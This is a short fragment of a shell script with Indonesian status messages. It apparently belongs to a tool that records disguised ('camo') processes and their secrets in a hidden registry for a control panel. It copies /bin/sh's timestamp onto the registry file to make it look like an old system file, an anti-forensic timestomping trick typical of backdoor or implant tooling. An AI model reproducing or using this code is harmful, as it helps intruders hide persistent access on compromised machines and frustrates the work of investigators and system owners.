        chmod 644 "$REGD/$REGID" 2>/dev/null
        touch -r /bin/sh "$REGD/$REGID" 2>/dev/null
        NOK=$((NOK+1))
        echo "[+] tercatat: $REGID | pid $p | $camo | secret: $sec"
    else
        echo "[x] GAGAL menulis registry untuk pid $p — catat manual di panel"
